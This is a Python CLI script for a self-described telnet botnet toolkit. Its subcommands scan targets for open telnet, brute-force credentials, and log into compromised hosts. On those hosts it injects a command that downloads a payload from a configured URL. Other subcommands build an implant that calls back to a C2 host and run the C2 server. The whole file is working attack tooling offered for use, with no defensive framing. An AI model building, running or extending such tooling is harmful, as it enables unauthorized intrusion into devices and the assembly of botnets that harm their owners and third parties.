#!/usr/bin/env python3
"""
run.py — CLI for the telnet botnet toolkit.

  python run.py scan   -f data/targets.txt
  python run.py brute  -f output/open_telnet.txt
  python run.py inject -f output/hits.txt
  python run.py c2
  python run.py build
  python run.py all    -f data/targets.txt
"""

import argparse

from botnet import (
    load_config, ensure_dirs, load_lines, load_creds,
    scan, brute, inject, build_implant, try_login,
)


def cmd_scan(args):
    cfg = load_config(args.config)
    ensure_dirs(cfg)
    scan(
        load_lines(args.file),
        port=cfg["scanner"]["port"],
        timeout=cfg["scanner"]["timeout"],
        threads=cfg["scanner"]["threads"],
        output=cfg["scanner"]["output"],
    )


def cmd_brute(args):
    cfg = load_config(args.config)
    ensure_dirs(cfg)
    brute(
        load_lines(args.file),
        load_creds(cfg["brute"].get("creds_file")),
        port=cfg["scanner"]["port"],
        threads=cfg["brute"]["threads"],
        timeout=cfg["brute"]["timeout"],
        prompt_delay=cfg["brute"]["prompt_delay"],
        output=cfg["brute"]["output"],
    )


def cmd_inject(args):
    cfg = load_config(args.config)
    ensure_dirs(cfg)

    hits = []
    for line in load_lines(args.file):
        try:
            addr, creds = line.split()
            host, port = addr.split(":")
            user, pw = creds.split(":")
            hits.append({"host": host, "port": int(port),
                         "user": user, "pass": pw})
        except Exception:
            continue

    live = []
    for h in hits:
        ok, sock = try_login(
            h["host"], h["port"], h["user"], h["pass"],
            timeout=cfg["brute"]["timeout"],
            prompt_delay=cfg["brute"]["prompt_delay"],
        )
        if ok:
            h["socket"] = sock
            live.append(h)

    inject(
        live,
        cfg["inject"]["inject_command"],
        cfg["inject"]["download_url"],
    )


def cmd_c2(args):
    from c2 import run_c2
    cfg = load_config(args.config)
    ensure_dirs(cfg)
    run_c2(cfg)


def cmd_build(args):
    cfg = load_config(args.config)
    ensure_dirs(cfg)
    build_implant(
        template_path="implant.sh",
        c2_host=cfg["implant"]["c2_host"],
        c2_port=cfg["implant"]["c2_port"],
        output_path=cfg["implant"]["output"],
    )


def cmd_all(args):
    cmd_build(args)
    cmd_scan(args)
    cmd_brute(args)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-c", "--config", default="config.yaml")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("scan");   p.add_argument("-f", "--file", required=True); p.set_defaults(fn=cmd_scan)
    p = sub.add_parser("brute");  p.add_argument("-f", "--file", required=True); p.set_defaults(fn=cmd_brute)
    p = sub.add_parser("inject"); p.add_argument("-f", "--file", required=True); p.set_defaults(fn=cmd_inject)
    p = sub.add_parser("c2");     p.set_defaults(fn=cmd_c2)
    p = sub.add_parser("build");  p.set_defaults(fn=cmd_build)
    p = sub.add_parser("all");    p.add_argument("-f", "--file", required=True); p.set_defaults(fn=cmd_all)

    args = ap.parse_args()
    args.fn(args)


if __name__ == "__main__":
    main()
